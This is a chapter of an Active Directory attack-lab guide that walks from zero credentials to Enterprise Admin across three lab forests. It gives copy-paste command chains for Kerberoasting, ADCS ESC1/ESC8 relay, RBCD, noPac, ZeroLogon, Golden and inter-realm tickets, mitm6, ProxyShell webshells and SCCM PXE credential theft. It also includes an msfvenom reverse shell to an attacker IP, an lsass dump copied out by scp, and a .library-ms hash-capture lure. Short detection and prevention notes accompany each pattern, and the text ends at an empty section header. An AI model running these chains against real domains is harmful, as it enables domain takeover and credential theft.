# 08 — Canonical Solve Path + Wireframe Diagrams

This is the page to read after you've skimmed the rest. It pulls the per-ID writeups together into:

1. A **canonical end-to-end solve** — zero credentials to Enterprise Admin across all three forests.
2. **Wireframe diagrams** of every major solving pattern. Each pattern is a sequence of techniques chained together. The big-picture pattern is in `00-index.md`; the per-pattern detail is here.

---

## 1. Canonical solve — zero → Enterprise Admin

Assume you're on **your own Kali / BlackArch** with reach into `10.10.0.0/21`, `10.20.0.0/24`, `10.30.0.0/24` from the host bridge — no credentials, no AD position, no foothold on any lab VM. Target: `Administrator@trade.corp`.

> Phase 0 (Initial Access, IA-001..050) covers every zero-cred entry vector in detail — see [`02a-initial-access.md`](02a-initial-access.md). The canonical solve below uses **AS-REP roast → spray** as the cheapest IA path. Alternatives that skip steps 1-2 entirely: ZeroLogon (DC$ hash directly, IA-014), PetitPotam+relay to ADCS (DC cert directly, IA-013), phishing a tatooine user (beacon → in-memory creds, IA-019..024).

```
STEP 0  ── Recon from Kali ────────────────────────────────
  nxc smb 10.10.0.0/21
  → enumerate hosts, OS, SMB signing status
  nxc ldap 10.10.0.10 -u '' -p ''                       # anon LDAP bind works
  bloodhound-python -u guest -p '' -d empire.local -ns 10.10.0.10 -c all
  → import to BloodHound, mark high-value: DA, EA, krbtgt, ADCS templates
```

```
STEP 1  ── Foothold #1: AS-REP roast ──────────────────────
  impacket-GetNPUsers empire.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
  → hash for svc_nopreauth
  hashcat -m 18200 asrep.hashes rockyou.txt
  → password recovered

STEP 1' ── Alternative foothold: spray ─────────────────────
  kerbrute passwordspray -d empire.local --dc 10.10.0.10 users.txt 'SithLord123!'
  → peter.parker : SithLord123!
```

```
STEP 2  ── Domain user ──────────────────────────────────
  bloodhound-python -u peter.parker -p '<pw>' -d empire.local -ns 10.10.0.10 -c all
  → full graph, paths to DA visible
```

```
STEP 3  ── Pick the shortest path ────────────────────────
  Path A: Kerberoast -> crack -> DA via service account
  Path B: ADCS ESC1/8 -> cert as DA
  Path C: Coerce + NTLM Relay -> ADCS ESC8 -> DC$ cert -> DCSync
  Path D: noPac (CVE-2021-42278/42287)
  Path E: ACL chain (WriteOwner Domain Admins, GenericWrite, etc.)
```

Below is **Path B** — the fastest in EMPIRE:

```
STEP 3.B  ── ADCS ESC1 chain ──────────────────────────────
  certipy find -u peter.parker -p '<pw>' -dc-ip 10.10.0.10 -vulnerable -stdout
  → ESC1Template found

  certipy req -u peter.parker -p '<pw>' -ca corp-CA-CA \
     -template ESC1Template -upn Administrator@empire.local \
     -target endor.empire.local
  → administrator.pfx

  certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
  → NT hash for Administrator@empire.local
```

```
STEP 4  ── DA on empire.local ──────────────────────────────
  impacket-secretsdump empire.local/Administrator@10.10.0.10 -hashes :<NT>  -just-dc
  → krbtgt hash, all user NT hashes, machine secrets
```

```
STEP 5  ── Forge Golden TGT (persistence + cross-domain) ─
  impacket-ticketer -nthash <KRBTGT_HASH> \
     -domain-sid S-1-5-21-EMPIRE \
     -domain empire.local \
     -extra-sid S-1-5-21-EMPIRE-EU-519 \
     -extra-sid S-1-5-21-TRADE-519 \
     Administrator
  export KRB5CCNAME=Administrator.ccache
```

```
STEP 6  ── Cross domain to trade.corp (Enterprise Admin) ──
  impacket-secretsdump -k -no-pass -just-dc \
     -target-ip 10.30.0.10 trade.corp/Administrator@neimoidia.trade.corp
  → EA hash; you are Enterprise Admin in trade.corp
```

```
STEP 7  ── Cross trust to rebel.local ──────────────────
  # forge inter-realm TGT with trust key
  impacket-ticketer -nthash <TRUSTKEY_NT> \
     -domain-sid S-1-5-21-EMPIRE \
     -domain empire.local \
     -spn 'krbtgt/rebel.local' \
     Administrator
  → use to request TGS into rebel.local resources
```

```
STEP 8  ── Persistence (pick at least one) ───────────────
  - Golden Certificate (CA private key) → durable across rotations
  - AdminSDHolder ACL backdoor          → self-healing every 60 min
  - DSRM backdoor                       → DC-local PtH path
  - GPO immediate-task on Default Domain Policy → re-pwn on every reboot
```

Done. ~45 minutes if everything goes smoothly; ~3-4 hours if you stop to learn what each step does.

---

## 2. Wireframe — Pattern A: Kerberoast chain

```
┌──────────────┐     impacket-GetUserSPNs    ┌──────────────────────────┐
│ Domain User  │ ─────────────────────────▶  │ TGS for svc_vision (RC4)    │
│ (peter.parker)      │                              │ TGS encrypted w/ svc_vision │
└──────────────┘                              │ NT hash                  │
                                              └────────────┬─────────────┘
                                                           │ hashcat -m 13100
                                                           ▼
                                              ┌──────────────────────────┐
                                              │ Plaintext: Summer2023!   │
                                              └────────────┬─────────────┘
                                                           ▼
                       ┌──────────────────────────────────────────────┐
                       │ svc_vision is local admin somewhere?  → PtH/PtT │
                       │ svc_vision has constrained deleg?   → S4U2Proxy  │
                       │ svc_vision in Server Operators?     → SCM → SYSTEM│
                       └──────────────────────────────────────────────┘
```

Detect: 4769 RC4 + bulk; honeypot SPN. Prevent: AES-only; gMSAs; 25+ char random svc pwds.

**Commands (copy-paste):**

```bash
# 1. Enumerate SPN-bearing accounts and request TGSes (RC4)
impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kerberoast

# 2. Crack offline
hashcat -m 13100 spns.kerberoast /usr/share/wordlists/rockyou.txt --force

# 3. Use the recovered password (svc_vision)
nxc smb 10.10.0.13 -u svc_vision -p 'Summer2023!'                       # local admin?
nxc ldap 10.10.0.10 -u svc_vision -p 'Summer2023!' --kerberoasting all  # second-hop
impacket-getST -spn cifs/coruscant.empire.local -impersonate Administrator empire.local/svc_vision:'Summer2023!'   # if constrained
```

---

## 3. Wireframe — Pattern B: ADCS ESC1

```
┌──────────────┐  certipy find              ┌─────────────────────────┐
│ Domain User  │ ─────────────────────────▶ │ ESC1Template            │
└──────┬───────┘                            │  - Client Auth EKU      │
       │                                     │  - ENROLLEE_SUPPLIES_   │
       │                                     │    SUBJECT             │
       │                                     │  - Domain Users enroll │
       │                                     │  - No manager approval │
       │                                     └────────────┬────────────┘
       │ certipy req -upn Administrator@empire.local        │
       ▼                                                   ▼
┌─────────────────────────┐                  ┌─────────────────────────┐
│  Cert for Administrator │ ◀──────────────  │ Enterprise CA issues    │
│  (pfx)                  │                  │ cert with SAN = Admin   │
└──────┬──────────────────┘                  └─────────────────────────┘
       │ certipy auth (PKINIT)
       ▼
┌─────────────────────────┐
│ TGT + NT hash for       │
│ Administrator           │
└─────────────────────────┘
```

Detect: 4886/4887 with requester≠SAN. Prevent: drop `ENROLLEE_SUPPLIES_SUBJECT` on Client-Auth templates; require approval.

**Commands (copy-paste):**

```bash
# 1. Find vulnerable templates
certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable

# 2. Request a cert as Administrator using ESC1
certipy req -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 \
            -ca 'EMPIRE-CA' -template 'ESC1Template' -upn 'Administrator@empire.local'

# 3. PKINIT → TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10

# 4. DCSync with the recovered hash
impacket-secretsdump -hashes :<NT> -just-dc empire.local/Administrator@10.10.0.10
```

---

## 4. Wireframe — Pattern C: Coerce + Relay → ESC8

```
┌────────────┐  EFSRPC OpenFileRaw    ┌─────────────────┐
│ Attacker   │ ─────────────────────▶ │ coruscant (target)   │
│ (PetitPotam│                         └────────┬────────┘
│  client)   │                                  │
└────────────┘                                  │ coruscant$ auth (NTLM)
   ▲                                            │ to attacker UNC
   │  send NTLM challenge from CA web enrollment
   │  back to coruscant
   │                                            ▼
┌──┴───────────────────────┐  relay NTLM   ┌─────────────────────┐
│ ntlmrelayx (--adcs       │ ◀────────────│  Attacker host      │
│ --template               │               │  (listens 445/80)   │
│ DomainController)        │               └─────────────────────┘
└──┬───────────────────────┘
   │ relayed creds to
   │ http://endor/certsrv
   ▼
┌──────────────────────────┐
│ CA issues cert for coruscant$ │
│ Domain Controller EKU    │
└──┬───────────────────────┘
   │ gettgtpkinit.py / certipy auth
   ▼
┌──────────────────────────┐
│ TGT for coruscant$ + NT hash  │ → DCSync → DA
└──────────────────────────┘
```

Detect: MDI ESC8; 4624 from DC$ to attacker IP; ADCS issuance to DC$ from non-DC. Prevent: disable NTLM on ADCS web; EPA; HTTPS only; KB5005413 RPC filter.

**Commands (copy-paste):**

```bash
# 1. Start ntlmrelayx targeting the ADCS web enrollment with DomainController template
sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                         --adcs --template DomainController -smb2support &

# 2. Coerce coruscant$ to authenticate to your attacker IP (10.10.0.1)
impacket-PetitPotam -u peter.parker -p 'EmpireLab2024!' -d empire.local 10.10.0.1 10.10.0.10
# (or: impacket-coercer -u peter.parker -p 'EmpireLab2024!' -d empire.local -t 10.10.0.10 -l 10.10.0.1)

# 3. Take the base64 cert ntlmrelayx prints; convert to PFX and use PKINIT
echo '<b64>' | base64 -d > coruscant.pfx
certipy auth -pfx coruscant.pfx -dc-ip 10.10.0.10 -username 'coruscant$' -domain empire.local

# 4. DCSync as coruscant$ → krbtgt
impacket-secretsdump -k -no-pass -just-dc-user krbtgt empire.local/coruscant\$@coruscant.empire.local
```

---

## 5. Wireframe — Pattern D: RBCD

```
                         ┌──────────────────┐
                         │ Domain User      │
                         │ peter.parker (MAQ=10)   │
                         └────────┬─────────┘
                                  │
                                  │ impacket-addcomputer
                                  ▼
                         ┌──────────────────┐
                         │ evil$ (attacker- │
                         │   owned machine) │
                         └────────┬─────────┘
                                  │
                                  │ rbcd.py: write msDS-AllowedToActOnBehalfOf
                                  │ on target (tatooine$)
                                  ▼
                         ┌──────────────────┐
                         │ tatooine$ allows     │
                         │ evil$ delegation │
                         └────────┬─────────┘
                                  │ getST -impersonate Administrator
                                  │     -spn cifs/tatooine.empire.local
                                  │     evil$ ccache
                                  ▼
                         ┌──────────────────┐
                         │ TGS as Admin@    │
                         │ cifs/tatooine        │
                         └────────┬─────────┘
                                  │ psexec -k -no-pass
                                  ▼
                         ┌──────────────────┐
                         │ SYSTEM on tatooine   │
                         └──────────────────┘
```

Detect: 4741 (computer created by non-admin), 5136 on `msDS-AllowedToActOnBehalfOfOtherIdentity`. Prevent: MachineAccountQuota=0; restrict RBCD writes.

**Commands (copy-paste):**

```bash
# 1. Create attacker-controlled machine account (MAQ=10 in EMPIRE)
impacket-addcomputer empire.local/peter.parker:'EmpireLab2024!' -computer-name 'evil$' \
                     -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10

# 2. Write RBCD attribute on the target (e.g., tatooine$)
impacket-rbcd -delegate-from 'evil$' -delegate-to 'tatooine$' -dc-ip 10.10.0.10 \
              -action write empire.local/peter.parker:'EmpireLab2024!'

# 3. S4U2Self+S4U2Proxy as evil$ impersonating Administrator
impacket-getST -spn cifs/tatooine.empire.local -impersonate Administrator \
               empire.local/evil\$:'EvilPass1!' -dc-ip 10.10.0.10

# 4. Use the ticket
export KRB5CCNAME=Administrator@cifs_tatooine.empire.local@empire.local.ccache
impacket-psexec -k -no-pass tatooine.empire.local
```

---

## 6. Wireframe — Pattern E: noPac (CVE-2021-42278/42287)

```
peter.parker                                                    coruscant
  │  addcomputer evil$  (MAQ=10)                          │
  │ ──────────────────────────────────────────────────▶   │
  │                                                       │ ok
  │ rename evil$ -> coruscant    (no trailing $)               │
  │ ──────────────────────────────────────────────────▶   │
  │                                                       │
  │ TGT request (S4U2Self for "coruscant")                     │
  │ ──────────────────────────────────────────────────▶   │
  │                              ◀───────── TGT for coruscant (KDC thinks DC) │
  │                                                       │
  │ rename coruscant -> evil$ back                             │
  │ ──────────────────────────────────────────────────▶   │
  │                                                       │
  │ S4U2Proxy: ask for cifs/coruscant ticket as Administrator  │
  │ ──────────────────────────────────────────────────▶   │
  │                              ◀───────── TGS for Admin@cifs/coruscant      │
  │                                                       │
  │ secretsdump -k -no-pass on coruscant                       │
  │ ──────────────────────────────────────────────────▶   │
  │                                              krbtgt dumped
```

Detect: 4741+4742+4624 mismatched name; MDI noPac. Prevent: patch KB5008380; MAQ=0.

**Commands (copy-paste):**

```bash
# EMPIRE: empire.local has MAQ=10 and is unpatched against noPac.
impacket-noPac.py empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
                  -dc-host coruscant.empire.local -shell --impersonate Administrator

# Or via impacket-addcomputer + manual rename:
impacket-addcomputer empire.local/peter.parker:'EmpireLab2024!' -computer-name 'evil$' \
                     -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
impacket-renameMachine empire.local/peter.parker:'EmpireLab2024!' -current-name 'evil$' -new-name 'coruscant' -dc-ip 10.10.0.10
impacket-getTGT empire.local/coruscant:'EvilPass1!' -dc-ip 10.10.0.10
impacket-renameMachine empire.local/peter.parker:'EmpireLab2024!' -current-name 'coruscant' -new-name 'evil$' -dc-ip 10.10.0.10
KRB5CCNAME=coruscant.ccache impacket-getST -self -impersonate Administrator -spn 'cifs/coruscant.empire.local' -k -no-pass empire.local/coruscant
KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass coruscant.empire.local
```

---

## 7. Wireframe — Pattern F: ZeroLogon (CVE-2020-1472)

```
attacker                                       coruscant (vuln)
   │ NetrServerAuthenticate2(zeros)            │
   │ ─────────────────────────────────────▶   │  (~256 attempts on avg)
   │                                            │  Netlogon AES-CFB8 IV=0 bug
   │                            ◀───── auth OK │  with all-zeros credential
   │                                            │
   │ NetrServerPasswordSet2(empty)              │
   │ ─────────────────────────────────────▶   │
   │                                            │  DC$ password = empty
   │ secretsdump -no-pass coruscant$@coruscant            │
   │ ─────────────────────────────────────▶   │
   │                            ◀───── krbtgt + everything
   │
   │  *** restore DC$ pwd ***                   │
   │  ─────────────────────────────────────▶   │  reinstall_original_pw.py
```

Detect: MDI native; Event 5827. Prevent: patch August 2020; `FullSecureChannelProtection=1`.

**Commands (copy-paste):**

```bash
# 1. Verify the DC is vulnerable
python3 zerologon_tester.py coruscant 10.10.0.10

# 2. Reset coruscant$ machine password to empty
python3 set_empty_pw.py coruscant 10.10.0.10

# 3. DCSync as coruscant$ with empty password
impacket-secretsdump -no-pass -just-dc empire.local/coruscant\$@10.10.0.10

# 4. Forge Golden Ticket with the krbtgt hash (now you are EA)
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain empire.local Administrator

# 5. CRITICAL: restore the original DC$ pwd from the secretsdump output
python3 reinstall_original_pw.py coruscant 10.10.0.10 <original_hex_pw>
```

---

## 8. Wireframe — Pattern G: ExtraSID (Parent → Child)

```
eu.empire.local DA  (already compromised)
   │
   │ DCSync krbtgt of eu.empire.local
   │
   │ mimikatz kerberos::golden
   │   /user:Administrator
   │   /domain:eu.empire.local
   │   /sid:S-1-5-21-EU
   │   /sids:S-1-5-21-EMPIRE-519,         <-- Enterprise Admins parent
   │         S-1-5-21-EMPIRE-512          <-- Domain Admins parent
   │   /krbtgt:<eu krbtgt hash>
   │
   ▼
TGT with foreign privileged SIDs
   │
   │ DCSync empire.local krbtgt
   ▼
Domain Admin on empire.local (=Enterprise Admin in single-tree forest)
```

Detect: MDI SID history. Prevent: parent-child SID filtering doesn't exist — *modern recommendation is a single-domain forest*.

**Commands (copy-paste):**

```bash
# Prereq: you already have DA on eu.empire.local (child). Then:

# 1. Get child's krbtgt hash + SIDs
impacket-secretsdump -just-dc-user krbtgt eu.empire.local/Administrator@10.10.0.11
impacket-lookupsid eu.empire.local/Administrator@10.10.0.11 | grep -i 'krbtgt\|domain'

# 2. Get parent (empire.local) domain SID
impacket-lookupsid empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 | head -5

# 3. Forge Golden Ticket in CHILD with parent EA/DA SIDs appended via /sids
impacket-ticketer -nthash <eu_krbtgt_nt> -domain-sid <EU_SID> -domain eu.empire.local \
                  -extra-sid <CORP_SID>-519,<CORP_SID>-512 Administrator

# 4. Use it to DCSync the PARENT
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc empire.local/Administrator@coruscant.empire.local
```

---

## 9. Wireframe — Pattern H: Golden Ticket persistence

```
DCSync krbtgt
   │
   ▼
NT hash of krbtgt
   │ mimikatz kerberos::golden /user:any /id:500 /groups:512,519,...
   ▼
Forged TGT for any principal
   │ inject (ptt)
   ▼
Auth to any service for ~10 years
   │
   ▼
KDC never created TGT (no 4768) → MDI "Golden Ticket usage" alert
```

Detect: 4769 with no preceding 4768 same TGT; 21 ticket lifetime / weird PAC. Prevent: rotate krbtgt **twice**; tier-0; monitor 4769s.

**Commands (copy-paste):**

```bash
# Prereq: krbtgt NT hash (from DCSync) + domain SID.
# EMPIRE bakes krbtgt=KrbtgtEmpire2024! so this is reproducible.

# 1. Compute krbtgt NT hash from the known plaintext
python3 -c "import hashlib; print(hashlib.new('md4', 'KrbtgtEmpire2024!'.encode('utf-16-le')).hexdigest())"

# 2. Forge a 10-year Golden Ticket for any principal
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain empire.local Administrator

# 3. Use it
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass coruscant.empire.local
```

---

## 10. Wireframe — Pattern I: Cross-forest via SID History + Trust key

```
empire.local DA
   │
   │ secretsdump -just-dc -user 'EMPIRE$' on coruscant.empire.local
   │ extract trust key  (empire.local <-> rebel.local)
   │
   ▼
Trust key NT hash
   │ mimikatz kerberos::golden
   │   /domain:empire.local
   │   /sid:S-1-5-21-EMPIRE
   │   /sids:S-1-5-21-REBEL-519       <-- foreign EA SID
   │   /rc4:<trustkey hash>
   │   /service:krbtgt
   │   /target:rebel.local
   │
   ▼
Inter-realm TGT
   │ Rubeus asktgs /service:cifs/yavin4.rebel.local
   ▼
TGS for rebel.local
   │
   ▼
DCSync krbtgt of rebel.local
```

Detect: MDI SID history; abnormal cross-realm `4769`. Prevent: SID filtering on every external trust; selective auth; rotate trust keys.

**Commands (copy-paste):**

```bash
# Prereq: DA on empire.local (parent of trust); EMPIRE trust key = TrustKey2024!

# 1. Dump the trust key for empire.local <-> rebel.local
impacket-secretsdump -just-dc-user 'rebel.local$' empire.local/Administrator@10.10.0.10

# 2. Get foreign SID (rebel.local Enterprise Admins = <FIN_SID>-519)
impacket-lookupsid empire.local/Administrator@10.10.0.10 'rebel.local'

# 3. Forge inter-realm TGT (golden trust ticket)
impacket-ticketer -nthash <trustkey_nt> -domain-sid <CORP_SID> \
                  -domain empire.local -extra-sid <FIN_SID>-519 \
                  -spn 'krbtgt/rebel.local' Administrator

# 4. Ask for a service ticket in the foreign forest and DCSync
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/yavin4.rebel.local -impersonate Administrator empire.local/Administrator
impacket-secretsdump -k -no-pass -just-dc rebel.local/Administrator@yavin4.rebel.local
```

---

## 10a. Wireframe — Pattern J: Phishing → tatooine foothold → in-memory creds

```
┌────────────────┐  GoPhish / evilginx          ┌──────────────────────┐
│ Attacker Kali  │ ───────── email ───────────▶ │ user@empire.local      │
│ (10.10.0.1)    │   .lnk / .iso / .hta /       │ (reads on tatooine)      │
│                │   library-ms / macro doc     └──────────┬───────────┘
└────────┬───────┘                                          │ double-click
         │ HTTPS C2 listener (Sliver / Mythic / Havoc)      │ payload runs
         │                                                  │ in user context
         │                              ◀────── reverse HTTPS beacon
         │                                                  ▼
         │                                       ┌──────────────────────┐
         │                                       │ tatooine.empire.local      │
         │                                       │ — Defender disabled  │
         │                                       │ — user is local admin│
         │                                       └──────────┬───────────┘
         │                                                  │ lsass dump
         │                              ◀────── NT hashes / TGTs of all
         │                                       interactive sessions
         │                                                  │
         │  SOCKS5 over beacon                              │
         ▼                                                  ▼
┌────────────────────────┐                       ┌──────────────────────┐
│ proxychains nxc / bh / │ ◀────────────────────│ pivot through tatooine   │
│ certipy from Kali      │                       │ to coruscant, endor, etc.  │
└────────────────────────┘                       └──────────────────────┘
```

Detect: Office spawning cmd/powershell (Sysmon 1, parent chain); LNK execution from %TEMP%; LSASS handle open with 0x1010; outbound HTTPS to non-CDN IP; ASR rules.
Prevent: ASR ("block Office child processes"); MOTW respected; Smart App Control; LSA Protection; Credential Guard; AV/EDR on workstations (EMPIRE has it off on purpose).

**Commands (copy-paste):**

```bash
# 1. Build a macro doc / .lnk / .library-ms payload that fetches your stage-2
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f hta-psh > stage1.hta
python3 -m http.server 8080   # serve stage1.hta + payload

# 2. After detonation on tatooine — dump lsass via comsvcs.dll (no mimikatz install)
# (run inside the beacon shell on tatooine)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Users\Public\l.dmp full

# 3. Exfil and parse offline with pypykatz
scp ... l.dmp .
pypykatz lsa minidump l.dmp

# 4. Pivot via SOCKS5
proxychains4 -q nxc smb 10.10.0.13 -u peter.parker -H <NTLM>
```

---

## 10b. Wireframe — Pattern K: mitm6 from attacker bridge

```
┌────────────────┐   DHCPv6 advertise         ┌────────────────────┐
│ Attacker Kali  │ ────── (every machine ───▶ │ Windows hosts on   │
│ 10.10.0.1      │        prefers IPv6) ────▶ │ empire.local subnet  │
│ mitm6 -d corp  │                            └─────────┬──────────┘
└────────┬───────┘                                       │
         │  attacker = primary DNS over IPv6             │ resolve wpad.empire.local
         │                              ◀────────────────┘
         │  serve WPAD → proxy → 407 NTLM challenge
         │
         │  NTLM auth from victim WORKSTATION$ (machine acct)
         ▼
┌──────────────────────────┐  relay to        ┌────────────────────┐
│ ntlmrelayx -6            │  ldap://coruscant     │ coruscant.empire.local    │
│   -t ldaps://coruscant        │ ───────────────▶ │ add new attacker   │
│   -wh wpad.empire.local    │                  │ machine acct +     │
│   --delegate-access      │                  │ set RBCD on victim │
└──────────────────────────┘                  └─────────┬──────────┘
                                                         │ getST -impersonate Administrator
                                                         ▼
                                              ┌────────────────────┐
                                              │ SYSTEM on victim   │
                                              └────────────────────┘
```

Detect: unsolicited DHCPv6; NTLM auth from machine account to attacker IP; 4741 (computer created by non-admin); 5136 on msDS-AllowedToActOnBehalfOf.
Prevent: disable IPv6 if unused, or RA Guard / DHCPv6 Guard on switches; deploy `wpad` A-record to a sinkhole; LDAP signing + channel binding; SMB signing required; MachineAccountQuota=0.

**Commands (copy-paste):**

```bash
# 1. Become the IPv6 router + DNS on the segment
sudo mitm6 -d empire.local -i <attacker_iface>

# 2. In parallel, relay any inbound NTLM (machine accts auto-auth) to LDAPS
#    --delegate-access creates evil$ + writes RBCD on the victim
sudo impacket-ntlmrelayx -6 -t ldaps://coruscant.empire.local -wh wpad.empire.local \
                         --delegate-access --no-smb-server

# 3. After ntlmrelayx logs "set msDS-AllowedToActOnBehalfOfOtherIdentity"
impacket-getST -spn cifs/<victim>.empire.local -impersonate Administrator \
               empire.local/<evil_machine>\$:'<pwd_from_relay_output>' -dc-ip 10.10.0.10

# 4. SYSTEM on the victim
export KRB5CCNAME=Administrator@cifs_<victim>.empire.local@empire.local.ccache
impacket-psexec -k -no-pass <victim>.empire.local
```

---

## 10c. Wireframe — Pattern L: ProxyShell unauth → mailbox → LPE

```
┌────────────────┐  GET /autodiscover/autodiscover.json?@evil  ┌───────────┐
│ Attacker Kali  │ ─────────────────────────────────────────▶ │ Exchange  │
│                │  (SSRF — CVE-2021-34473)                    │ OWA       │
└────────┬───────┘                              ◀────── path  └─────┬─────┘
         │  POST /powershell?X-Rps-CAT=... (CVE-2021-34523)         │
         │  → New-MailboxExportRequest (CVE-2021-31207)             │
         │                                                          ▼
         │                                               ┌────────────────────┐
         │                              ◀────── shell ── │ Write .aspx to     │
         │                                               │ public mailbox     │
         │                                               │ → IIS execution    │
         │                                               └─────────┬──────────┘
         │ NETWORK SERVICE on Exchange                              │
         ▼                                                          │
┌──────────────────────────┐                                        │
│ Exchange machine acct    │ ◀──────────────────────────────────────┘
│ has WriteDACL on Domain  │
│ object (pre-Nov 2019)    │ ── DCSync ──▶ Domain Admin
└──────────────────────────┘
```

Detect: 401/200 on /autodiscover.json with weird @host; ASPX in mailbox export paths; w3wp spawning powershell.
Prevent: patch (KB5003435+); EM/EAC URL rewrite rule; remove pre-Nov-2019 Exchange privileges (Active Directory split permissions); EWS throttling.

**Commands (copy-paste):**

```bash
# NOTE: EMPIRE does not ship Exchange by default — this pattern is documented for
# operators who add a vulnerable Exchange VM to extend the lab.

# 1. Identify Exchange + email enumeration
python3 ProxyShell.py -t https://exchange.empire.local -e Administrator@empire.local

# 2. Drop webshell via mailbox export (CVE chain CVE-2021-34473/34523/31207)
python3 ProxyShell-Auto.py --target exchange.empire.local --email Administrator@empire.local

# 3. Webshell → command exec → DCSync (Exchange has WriteDACL on Domain pre-Nov-2019)
curl 'https://exchange.empire.local/aspnet_client/shell.aspx?cmd=whoami'
```

---

## 10d. Wireframe — Pattern M: SCCM PXE boot (no-password) → NAA harvest

```
┌────────────────┐  DHCP option 60/66/67       ┌────────────────────┐
│ Attacker Kali  │ ─── boot from PXE  ────────▶│ SCCM DP / WDS      │
│ + pxeboot.py   │                              │ ws-pxe.empire.local  │
└────────┬───────┘                              └─────────┬──────────┘
         │                                                 │ TFTP boot.wim
         │                              ◀───────── policy.xml + media
         │
         │  decrypt media variables file with empty pwd
         ▼
┌──────────────────────────┐
│ Network Access Account   │
│ (NAA) cleartext creds in │
│ TS variables             │
└──────────┬───────────────┘
           │ NAA = domain user with content access
           ▼
┌──────────────────────────┐
│ Pivot: NAA is often      │
│ over-privileged →        │
│ access to SCCM site DB → │
│ site admin → DA          │
└──────────────────────────┘
```

Detect: PXE boots from unexpected MAC; SCCM audit on policy retrieval; abnormal AdminService / SMS Provider calls.
Prevent: PXE password enforced; enhanced HTTP / PKI mode; NAA deprecated → use enhanced HTTP enrollment; tier SCCM admins.

**Commands (copy-paste):**

```bash
# NOTE: EMPIRE doesn't ship SCCM; pattern documented for operators who add it.

# 1. PXE boot from attacker VM on same L2
python3 PXEThief.py -d empire.local --target ws-pxe.empire.local
# OR boot a UEFI shell, capture WIM/SDI variable file

# 2. Decrypt the TS variables file (empty PXE password ⇒ blob is decryptable)
python3 pxe_thief_decrypt.py policy.xml

# 3. Use the recovered NAA credentials
nxc smb 10.10.0.0/24 -u <NAA_USER> -p '<NAA_PASS>'
```

---

## 10e. Wireframe — Pattern N: USB / LNK drop (HID + library-ms)

```
┌────────────────┐   physical drop             ┌──────────────────────┐
│ Attacker (you) │ ── "Salaries Q3.zip" ──────▶│ User on tatooine         │
│ packaged ZIP   │     contains .library-ms    │ unzips, Explorer     │
│ w/ .library-ms │     → CVE-2025-24071        │ previews .library-ms │
└────────┬───────┘                              └──────────┬───────────┘
         │  responder -wIv eth0                            │ NTLM auth
         │  (or smbserver.py)                              │ to attacker
         │                                                 │ SMB share
         │                              ◀──── WORKSTATION$ ──────────────┐
         │                                  + user NTLMv2 hash           │
         │                                                                ▼
         │  hashcat -m 5600 (NTLMv2)                       ┌──────────────────┐
         ▼                                                  │ User credential  │
┌────────────────────┐                                      └──────────────────┘
│ Cracked NT hash    │
│ → spray, pivot,    │
│ Kerberoast, etc.   │
└────────────────────┘
```

Detect: NTLM auth from internal client to RFC1918 attacker IP; SMB outbound from workstation to non-server; ASR rule "block USB executables."
Prevent: disable AutoPlay; block `.library-ms` MIME / strip from email; ASR rules; SMB signing required; Block outbound 445 from clients; KB5044284 for CVE-2025-24071.

**Commands (copy-paste):**

```bash
# 1. Build a .library-ms with UNC pointing at your attacker IP
cat > 'Salaries_Q3.library-ms' <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation><url>\\10.10.0.1\share</url></simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
EOF
zip 'Salaries_Q3.zip' 'Salaries_Q3.library-ms'

# 2. Run Responder OR a fake SMB to capture NTLMv2 when victim previews
sudo responder -I <attacker_iface> -wv

# 3. Crack
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 10g. Wireframe — Pattern O: ACL Chaining (BloodHound Paths)

```
┌────────────────┐   BloodHound highlights      ┌──────────────────────┐
│ peter.parker   │ ─────── GenericAll ────────▶ │ tony.stark           │
│ qa_user        │ ───────── AddSelf ─────────▶ │ Avengers Admins      │
│ developer1     │ ──── ForceChangePassword ──▶ │ nick.fury            │
│ nick.fury      │ ───────── WriteSPN ────────▶ │ svc_vision           │
│ SHIELD Agents  │ ────── GenericWrite ───────▶ │ Avengers Admins      │
│ nick.fury      │ ──────── WriteOwner ───────▶ │ Domain Admins        │
│ steve.rogers   │ ─────── GenericAll ────────▶ │ AdminSDHolder        │
│ loki           │ ─────── GenericAll ────────▶ │ scarif$ & kamino$     │
└────────────────┘                              └──────────────────────┘
```

**Canonical Chain Example:**
1. Compromise `developer1` (e.g. via password spray).
2. Reset `nick.fury` password (`ForceChangePassword`).
3. Login as `nick.fury`.
4. Exploit `WriteSPN` over `svc_vision` for Targeted Kerberoasting.
   *OR* Exploit `WriteOwner` over `Domain Admins` (take ownership, grant yourself full control, add to group).
   
*Alternative Path:*
1. Compromise `qa_user`.
2. Exploit `AddSelf` to add yourself to `Avengers Admins`.

Detect: BloodHound/AzureHound queries, 4739 (Domain Policy Changed), 4728 (Member Added to Security-Enabled Global Group).
Prevent: Tidy up misconfigured ACLs using BloodHound data; enforce tiering models; remove arbitrary `WriteOwner`/`GenericAll` rights from standard users.

---

## 10h. Wireframe — Pattern P: ExtraSID (Child → Parent, rebel.local variant)

